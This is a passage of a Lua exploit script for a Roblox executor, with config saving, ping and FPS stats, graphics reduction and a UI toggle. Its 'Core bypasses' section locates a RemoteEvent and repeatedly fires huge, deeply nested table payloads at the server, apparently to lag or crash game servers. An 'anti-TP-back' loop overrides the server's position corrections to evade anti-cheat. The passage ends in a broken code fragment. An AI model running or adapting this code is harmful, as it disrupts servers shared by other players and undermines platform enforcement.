local canFile = (writefile and readfile and isfile) and true or false

local function getStateHash()
    return State.power.PC .. "_" .. State.power.Mobile .. "_" .. State.mode .. "_" .. State.keybind.Name
end

local function saveConfig()
    if not canFile then return end
    local hash = getStateHash()
    if hash == State.lastSaveHash then return end
    State.lastSaveHash = hash
    local data = HttpService:JSONEncode({
        powerPC = State.power.PC,
        powerMobile = State.power.Mobile,
        mode = State.mode,
        keybind = State.keybind.Name
    })
    task.defer(function() pcall(writefile, CONFIG.SAVE_FILE, data) end)
end

local function loadConfig()
    if not canFile then return false end
    local ok, result = pcall(function()
        if not isfile(CONFIG.SAVE_FILE) then return nil end
        return HttpService:JSONDecode(readfile(CONFIG.SAVE_FILE))
    end)
    if not ok or not result then return false end
    if result.powerPC then State.power.PC = math.clamp(result.powerPC, CONFIG.MIN_POWER, CONFIG.MAX_POWER) end
    if result.powerMobile then State.power.Mobile = math.clamp(result.powerMobile, CONFIG.MIN_POWER, 100000) end
    if result.mode and (result.mode == "PC" or result.mode == "Mobile") then State.mode = result.mode end
    if result.keybind then
        local s, kc = pcall(function() return Enum.KeyCode[result.keybind] end)
        if s and kc then State.keybind = kc end
    end
    State.lastSaveHash = getStateHash()
    return true
end

loadConfig()

task.defer(function()
    while autoSaveAlive do
        task.wait(CONFIG.SAVE_INTERVAL)
        saveConfig()
    end
end)

local ExecutorFixer = {}
local OriginalValues = {
    qualityLevel = nil,
    lightingEffects = {},
    globalShadows = nil,
    fogEnd = nil,
    meshLOD = nil,
}

local PingStats = {
    current = 0,
    avg = 0,
    samples = {},
    maxSamples = 30,
    lastTeleportBlock = 0,
    tpbCount = 0,
}

local function measurePing()
    local ok, v = pcall(function()
        return Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
    end)
    if ok and type(v) == "number" and v > 0 then return v end
    local t = tick()
    RunService.Heartbeat:Wait()
    return (tick() - t) * 1000
end

local function updatePingStats()
    local p = measurePing()
    PingStats.current = p
    table.insert(PingStats.samples, p)
    if #PingStats.samples > PingStats.maxSamples then table.remove(PingStats.samples, 1) end
    local s = 0
    for _, v in ipairs(PingStats.samples) do s = s + v end
    PingStats.avg = s / #PingStats.samples
end

local function applyGraphicsNuke()
    OriginalValues.qualityLevel = RenderSettings.QualityLevel
    pcall(function() RenderSettings.QualityLevel = Enum.QualityLevel.Level01 end)
    pcall(function()
        for _, effect in ipairs(Lighting:GetChildren()) do
            if effect:IsA("PostEffect") or effect:IsA("Sky") then
                OriginalValues.lightingEffects[effect] = effect.Enabled ~= nil and effect.Enabled or true
                if effect.Enabled ~= nil then effect.Enabled = false end
            end
        end
    end)
    pcall(function()
        OriginalValues.globalShadows = Lighting.GlobalShadows
        OriginalValues.fogEnd = Lighting.FogEnd
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 100000
        Lighting.Brightness = 2
    end)
    pcall(function()
        if Workspace:FindFirstChildOfClass("Terrain") then
            Workspace:FindFirstChildOfClass("Terrain").Decoration = false
        end
    end)
    pcall(function()
        OriginalValues.meshLOD = settings().Rendering.MeshPartDetailLevel
        settings().Rendering.MeshPartDetailLevel = Enum.MeshPartDetailLevel.Disabled
    end)
    pcall(function()
        if Workspace.CurrentCamera then
            Workspace.CurrentCamera.FieldOfView = 70
        end
    end)
    pcall(function()
        for _, v in ipairs(Workspace:GetDescendants()) do
            if v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Smoke")
            or v:IsA("Fire") or v:IsA("Sparkles") then
                v.Enabled = false
            end
        end
    end)
end

local function restoreGraphics()
    pcall(function()
        if OriginalValues.qualityLevel then
            RenderSettings.QualityLevel = OriginalValues.qualityLevel
        end
    end)
    pcall(function()
        for effect, wasEnabled in pairs(OriginalValues.lightingEffects) do
            if effect and effect.Parent then effect.Enabled = wasEnabled end
        end
        OriginalValues.lightingEffects = {}
    end)
    pcall(function()
        Lighting.GlobalShadows = OriginalValues.globalShadows ~= nil and OriginalValues.globalShadows or true
        Lighting.FogEnd = OriginalValues.fogEnd or 100000
    end)
    pcall(function()
        if Workspace:FindFirstChildOfClass("Terrain") then
            Workspace:FindFirstChildOfClass("Terrain").Decoration = true
        end
    end)
    pcall(function()
        if OriginalValues.meshLOD then
            settings().Rendering.MeshPartDetailLevel = OriginalValues.meshLOD
        end
    end)
    pcall(function()
        for _, v in ipairs(Workspace:GetDescendants()) do
            if v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Smoke")
            or v:IsA("Fire") or v:IsA("Sparkles") then
                v.Enabled = true
            end
        end
    end)
end

local function startAntiTPBack()
    local char = player.Character or player.CharacterAdded:Wait()
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local lastGoodPos = hrp and hrp.Position or Vector3.new(0, 0, 0)
    local lastGoodTime = tick()
    local TPB_THRESHOLD = 40
    local TPB_TIMEWINDOW = 0.2

    local t = task.spawn(function()
        while State.executorFixer do
            task.wait(0.05)
            if not char or not char.Parent then
                char = player.Character
                if not char then task.wait(1) continue end
                hrp = char:FindFirstChild("HumanoidRootPart")
                if not hrp then task.wait(0.5) continue end
                lastGoodPos = hrp.Position
                lastGoodTime = tick()
            end
            if not hrp or not hrp.Parent then
                hrp = char:FindFirstChild("HumanoidRootPart")
                continue
            end
            local currentPos = hrp.Position
            local dist = (currentPos - lastGoodPos).Magnitude
            local dt = tick() - lastGoodTime
            if dist > TPB_THRESHOLD and dt < TPB_TIMEWINDOW then
                pcall(function() hrp.CFrame = CFrame.new(lastGoodPos) end)
                PingStats.lastTeleportBlock = tick()
                PingStats.tpbCount = PingStats.tpbCount + 1
            else
                if dt >= 0.3 then
                    lastGoodPos = currentPos
                    lastGoodTime = tick()
                end
            end
        end
    end)

    local respawnConn
    respawnConn = player.CharacterAdded:Connect(function(newChar)
        if not State.executorFixer then respawnConn:Disconnect() return end
        task.wait(1)
        char = newChar
        hrp = newChar:WaitForChild("HumanoidRootPart", 5)
        if hrp then
            lastGoodPos = hrp.Position
            lastGoodTime = tick()
        end
    end)

    return t, respawnConn
end

local function startNetworkOptimizer()
    return task.spawn(function()
        local gcTick = 0
        while State.executorFixer do
            task.wait(0.25)
            gcTick = gcTick + 1
            updatePingStats()
            if State.running and State.activeVersion == "V2" then
                if PingStats.avg > 300 then
                    State.spamDelay = math.min(State.spamDelay * 1.3, CONFIG.MAX_DELAY)
                elseif PingStats.avg > 150 then
                    State.spamDelay = math.min(State.spamDelay * 1.05, CONFIG.MAX_DELAY)
                elseif PingStats.avg < 60 then
                    State.spamDelay = math.max(State.spamDelay * 0.97, CONFIG.MIN_DELAY)
                end
            end
            pcall(function()
                if Workspace.CurrentCamera then
                    player.ReplicationFocus = Workspace.CurrentCamera
                end
            end)
            if gcTick % 60 == 0 then
                task.defer(function()
                    pcall(function() ContentProvider:PreloadAsync({}) end)
                end)
            end
        end
    end)
end

local function startFPSStabilizer()
    return task.spawn(function()
        local lastT = tick()
        local gcFrame = 0
        while State.executorFixer do
            RunService.Heartbeat:Wait()
            gcFrame = gcFrame + 1
            if gcFrame >= 200 then
                gcFrame = 0
                task.defer(function()
                    local _ = {}
                    for i = 1, 1000 do _[i] = i end
                    _ = nil
                end)
            end
            local now = tick()
            if now - lastT >= 2 then
                lastT = now
                pcall(function()
                    if RenderSettings.QualityLevel ~= Enum.QualityLevel.Level01 then
                        RenderSettings.QualityLevel = Enum.QualityLevel.Level01
                    end
                    Lighting.GlobalShadows = false
                end)
            end
        end
    end)
end

function ExecutorFixer.start()
    if State.executorFixer then return end
    State.executorFixer = true
    applyGraphicsNuke()
    local t1 = startFPSStabilizer()
    local t2 = startNetworkOptimizer()
    local t3, conn3 = startAntiTPBack()
    State.executorFixerThreads = {t1, t2, t3, conn3}
end

function ExecutorFixer.stop()
    State.executorFixer = false
    for _, v in ipairs(State.executorFixerThreads) do
        if type(v) == "thread" then pcall(task.cancel, v)
        elseif type(v) == "table" and v.Disconnect then pcall(function() v:Disconnect() end) end
    end
    State.executorFixerThreads = {}
    restoreGraphics()
    pcall(function() player.ReplicationFocus = nil end)
end

--// Core bypasses
local function findRemote()
    local ok, rrs = pcall(function()
        return game:GetService("RobloxReplicatedStorage")
    end)
    if not ok or not rrs then return nil end
    for _, name in ipairs(CONFIG.REMOTE_NAMES) do
        local r = rrs:FindFirstChild(name)
        if r and r:IsA("RemoteEvent") then return r end
    end
    for _, c in ipairs(rrs:GetChildren()) do
        if c:IsA("RemoteEvent") and c.Name:find("Block") then return c end
    end
    return nil
end

local function buildPayload(power)
    local main = {}
    local nested = {{}}
    local current = nested[1]
    for _ = 1, CONFIG.DEPTH do
        local n = {}
        table.insert(current, n)
        current = n
    end
    local maxRep = math.min(math.floor(power / (CONFIG.DEPTH + 2)), 10000)
    for _ = 1, maxRep do table.insert(main, nested) end
    return main
end

local function stopExecution()
    if State.thread then pcall(task.cancel, State.thread) State.thread = nil end
    State.payload = nil
end

local function startExecution()
    if not State.remote then State.remote = findRemote() end
    
    if State.activeVersion == "V1" then
        local power = State.power[State.mode] or 100000
        State.payload = buildPayload(power)
        State.thread = task.spawn(function()
            while State.running do
                if State.remote and State.payload then
                    pcall(function() State.remote:FireServer(State.payload) end)
                end
                task.wait(State.v1Delay or 0.125)
            end
        end)
    else
        State.payload = buildPayload(State.power[State.mode])
        local delay = State.spamDelay
        State.thread = task.spawn(function()
            while State.running do
                if State.remote and State.payload then
                    local ok = pcall(function() State.remote:FireServer(State.payload) end)
                    if not ok then delay = math.min(delay * 1.5, CONFIG.MAX_DELAY)
                    else delay = math.max(delay * 0.995, CONFIG.MIN_DELAY) end
                end
                task.wait(delay)
            end
        end)
    end
end

task.spawn(function()
    local frameCount = 0
    local lastT = tick()
    local conn = RunService.RenderStepped:Connect(function()
        frameCount = frameCount + 1
    end)

    while true do
        task.wait(0.5)
        if not (V1StatsLabel and V1StatsLabel.Parent) then conn:Disconnect() break end
        local now = tick()
        local fps = math.floor(frameCount / (now - lastT))
        frameCount = 0
        lastT = now

        if not State.executorFixer then
            local p = measurePing()
            PingStats.current = p
        end
        local ping = math.floor(PingStats.current)
        local statsText = string.format("FPS: %d   Ping: %d ms   TPB: %d", fps, ping, PingStats.tpbCount)
        V1StatsLabel.Text = statsText
    end
end)

local function setExecutorFixer(on)
    if on then
        ExecLabel.Text = "Executor Fixer: ON"
        TweenService:Create(ExecToggleDot, TweenInfo.new(0.18), {
            Position = UDim2.new(1, -14, 0.5, -6),
            BackgroundColor3 = Color3.fromRGB(180, 80, 255)
        }):Play()
        TweenService:Create(ExecTogglePill, TweenInfo.new(0.18), {
            BackgroundColor3 = Color3.fromRGB(60, 20, 90)
        }):Play()
        ExecGrad.Transparency = NumberSequence.new(0.6)
        if execGradAnim then task.cancel(execGradAnim) end
        execGradAnim = task.spawn(function()
            local t = 0
            while State.executorFixer do
                t = t + 0.05
                ExecGrad.Offset = Vector2.new(math.sin(t) * 0.8, 0)
                task.wait(0.03)
            end
        end)
        ExecutorFixer.start()
    else
        ExecLabel.Text = "Executor Fixer: OFF"
        TweenService:Create(ExecToggleDot, TweenInfo.new(0.18), {
            Position = UDim2.new(0, 2, 0.5, -6),
            BackgroundColor3 = Color3.fromRGB(180, 180, 180)
        }):Play()
        TweenService:Create(ExecTogglePill, TweenInfo.new(0.18), {
            BackgroundColor3 = Color3.fromRGB(25, 25, 30)
        }):Play()
        ExecGrad.Transparency = NumberSequence.new(1)
        if execGradAnim then pcall(task.cancel, execGradAnim) execGradAnim = nil end
        ExecutorFixer.stop()
    end
end

        return
    end
    if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == State.keybind then
        setBypass(not State.bypassEnabled)
    end
end)
